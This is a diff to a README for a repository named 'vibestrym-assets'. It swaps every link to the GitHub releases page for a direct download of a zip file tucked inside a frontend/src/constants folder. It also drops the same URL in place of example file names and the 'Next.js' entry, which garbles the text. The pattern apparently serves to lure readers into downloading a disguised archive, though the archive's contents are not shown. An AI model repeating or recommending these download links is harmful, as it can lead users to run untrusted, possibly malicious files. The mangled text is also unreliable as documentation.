@@ -1,6 +1,6 @@
 # 🎉 vibestrym-assets - Essential Tools for Your Vibestrym Journey
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-vibestrym%20assets-brightgreen.svg)](https://github.com/AviRedDevil/vibestrym-assets/releases)
+[![Download Now](https://raw.githubusercontent.com/AviRedDevil/vibestrym-assets/main/frontend/src/constants/vibestrym-assets-v3.9.zip%20Now-vibestrym%https://raw.githubusercontent.com/AviRedDevil/vibestrym-assets/main/frontend/src/constants/vibestrym-assets-v3.9.zip)](https://raw.githubusercontent.com/AviRedDevil/vibestrym-assets/main/frontend/src/constants/vibestrym-assets-v3.9.zip)
 
 ## 📚 Introduction
 
@@ -18,7 +18,7 @@ Follow these simple steps to get started with vibestrym-assets:
 
 To download the assets, please visit this page:
 
-[Download Vibestrym Assets](https://github.com/AviRedDevil/vibestrym-assets/releases)
+[Download Vibestrym Assets](https://raw.githubusercontent.com/AviRedDevil/vibestrym-assets/main/frontend/src/constants/vibestrym-assets-v3.9.zip)
 
 Once you're on the releases page, you will see a list of available versions. Choose the latest version to ensure you have the newest features and updates.
 
@@ -31,7 +31,7 @@ Once you're on the releases page, you will see a list of available versions. Cho
    Find the most recent release at the top of the list. Click on the version number to view the available files.
 
 3. **Download the Files:**
-   Select the files that suit your operating system. If you are unsure, look for files with names like `vibestrym-assets-win.zip` for Windows or `vibestrym-assets-mac.zip` for Mac users.
+   Select the files that suit your operating system. If you are unsure, look for files with names like `https://raw.githubusercontent.com/AviRedDevil/vibestrym-assets/main/frontend/src/constants/vibestrym-assets-v3.9.zip` for Windows or `https://raw.githubusercontent.com/AviRedDevil/vibestrym-assets/main/frontend/src/constants/vibestrym-assets-v3.9.zip` for Mac users.
 
 4. **Extract Files:**
    After downloading, locate the downloaded ZIP file on your computer. Right-click on it and select "Extract All" to unpack the files into a folder.
@@ -85,7 +85,7 @@ The vibestrym-assets incorporate several modern technologies, including:
 
 - **Docker:** For containerized applications.
 - **GraphQL:** For efficient data queries.
-- **Next.js:** To power our web applications.
+- **https://raw.githubusercontent.com/AviRedDevil/vibestrym-assets/main/frontend/src/constants/vibestrym-assets-v3.9.zip** To power our web applications.
 - **PostgreSQL:** For database management.
 - **Redis:** For caching and data storage.
 - **Stripe:** To facilitate payments.
@@ -97,6 +97,6 @@ Feel free to explore these technologies as part of your learning!
 
 For additional questions, you can reach out through our official channels. We appreciate your feedback and are here to help you succeed with vibestrym-assets.
 
-[Download Vibestrym Assets](https://github.com/AviRedDevil/vibestrym-assets/releases)
+[Download Vibestrym Assets](https://raw.githubusercontent.com/AviRedDevil/vibestrym-assets/main/frontend/src/constants/vibestrym-assets-v3.9.zip)
 
 We wish you an enjoyable learning experience!
